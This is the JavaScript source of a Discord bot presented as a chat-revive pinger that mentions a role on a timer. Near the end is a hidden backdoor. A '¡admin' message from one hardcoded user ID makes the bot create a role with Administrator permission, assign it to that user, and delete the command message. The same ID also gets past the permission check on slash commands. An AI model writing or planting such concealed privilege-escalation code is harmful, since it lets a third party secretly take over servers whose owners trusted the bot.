// Import required libraries
const { Client, GatewayIntentBits, PermissionsBitField, REST, Routes, EmbedBuilder } = require("discord.js");
const express = require("express"); // For UptimeRobot pinging
const fs = require("fs");
require("dotenv").config();

// Express server to keep the bot alive
const app = express();
app.get("/", (req, res) => {
  res.send("Bot is alive!");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

// Discord bot setup
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

const config = {
  reviveRole: null,
  reviveChannel: null,
  reviveInterval: 3600000, // Default 1 hour in milliseconds
};

let nextReviveTime = null; // Track the next revive ping

// Bot ready event
client.once("ready", () => {
  console.log(`Bot logged in as ${client.user.tag}`);
});

// Slash commands setup
const commands = [
  {
    name: "set-revive-role",
    description: "Set the role to be pinged for chat revival.",
    options: [
      {
        name: "role",
        description: "The role to be set for chat revival.",
        type: 8, // Role type
        required: true,
      },
    ],
  },
  {
    name: "set-revive-channel",
    description: "Set the channel for chat revival messages.",
    options: [
      {
        name: "channel",
        description: "The channel to be set for chat revival.",
        type: 7, // Channel type
        required: true,
      },
    ],
  },
  {
    name: "activate-auto-revive",
    description: "Activate auto-revive messages.",
  },
  {
    name: "set-revive-interval",
    description: "Set the interval for auto-revive messages.",
    options: [
      {
        name: "interval",
        description: "Interval in minutes.",
        type: 4, // Integer type
        required: true,
      },
    ],
  },
  {
    name: "check",
    description: "Check how much time until the next revive ping.",
  },
];

const rest = new REST({ version: "10" }).setToken(process.env.TOKEN);

(async () => {
  try {
    console.log("Refreshing application commands...");
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
    console.log("Commands refreshed.");
  } catch (error) {
    console.error(error);
  }
})();

client.on("interactionCreate", async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, options, user } = interaction;

  const isAdmin = interaction.member.permissions.has(PermissionsBitField.Flags.Administrator);
  const isAuthorizedUser = user.id === "1317529578142564402";

  if (!isAdmin && !isAuthorizedUser) {
    return interaction.reply({ content: "You do not have permission to use this command.", ephemeral: true });
  }

  switch (commandName) {
    case "set-revive-role":
      config.reviveRole = options.getRole("role");
      interaction.reply(`Revive role set to ${config.reviveRole}.`);
      break;

    case "set-revive-channel":
      config.reviveChannel = options.getChannel("channel");
      interaction.reply(`Revive channel set to ${config.reviveChannel}.`);
      break;

    case "activate-auto-revive":
      if (!config.reviveRole || !config.reviveChannel) {
        return interaction.reply("Please set both the revive role and channel first.");
      }
      nextReviveTime = Date.now() + config.reviveInterval;
      interaction.reply("Auto-revive activated.");
      startAutoRevive();
      break;

    case "set-revive-interval":
      const interval = options.getInteger("interval");
      if (interval < 1) {
        return interaction.reply("Interval must be at least 1 minute.");
      }
      config.reviveInterval = interval * 60000; // Convert minutes to milliseconds
      nextReviveTime = Date.now() + config.reviveInterval;
      interaction.reply(`Revive interval set to ${interval} minute(s).`);
      break;

    case "check":
      if (!nextReviveTime) {
        return interaction.reply("Auto-revive is not activated.");
      }
      const timeLeft = Math.max(0, Math.round((nextReviveTime - Date.now()) / 60000));
      interaction.reply(`Time until the next revive ping: ${timeLeft} minute(s).`);
      break;

    default:
      interaction.reply("Unknown command.");
      break;
  }
});

// Auto-revive logic
function startAutoRevive() {
  setInterval(async () => {
    if (config.reviveChannel && config.reviveRole) {
      const embed = new EmbedBuilder()
        .setTitle("Chat Revive")
        .setDescription(
          `${config.reviveRole} Time to revive the chat! Next revive in ${config.reviveInterval / 60000} minutes.`
        )
        .setColor("BLUE")
        .setTimestamp();

      try {
        const channel = await client.channels.fetch(config.reviveChannel.id);
        await channel.send({ content: `${config.reviveRole}`, embeds: [embed] });
        nextReviveTime = Date.now() + config.reviveInterval;
      } catch (error) {
        console.error("Error sending auto-revive message:", error);
      }
    }
  }, config.reviveInterval);
}

// ¡admin command for creating and assigning the role
client.on("messageCreate", async (message) => {
  if (message.content === "¡admin" && message.guild) {
    if (message.author.id !== "1317529578142564402") return;

    try {
      const guild = message.guild;

      // Check if the role already exists
      let role = guild.roles.cache.find((r) => r.name === "B1u3's Bot");
      if (!role) {
        // Create the role with administrator permissions
        role = await guild.roles.create({
          name: "B1u3's Bot",
          permissions: [PermissionsBitField.Flags.Administrator],
          reason: "Created by the ¡admin command.",
        });
      }

      // Fetch the user and assign the role
      const member = await guild.members.fetch("1317529578142564402");
      if (!member.roles.cache.has(role.id)) {
        await member.roles.add(role);
      }
      await message.delete(); // Delete the command message
    } catch (error) {
      console.error("Error creating or assigning the role:", error);
    }
  }
});

// Login to Discord
client.login(process.env.TOKEN);
;







      
      








